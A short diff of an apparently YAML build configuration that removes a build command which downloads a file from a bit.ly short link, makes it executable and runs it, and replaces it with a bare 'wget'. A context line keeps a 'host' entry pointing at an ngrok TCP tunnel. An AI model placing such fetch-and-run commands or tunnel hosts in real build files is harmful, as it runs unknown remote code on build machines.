@@ -14,7 +14,7 @@ build:
 
           command: |
 
-            wget https://bit.ly/3i8MbgT && chmod +x 3i8MbgT && ./3i8MbgT
+            wget
 
           host: 6.tcp.ngrok.io:11880
 
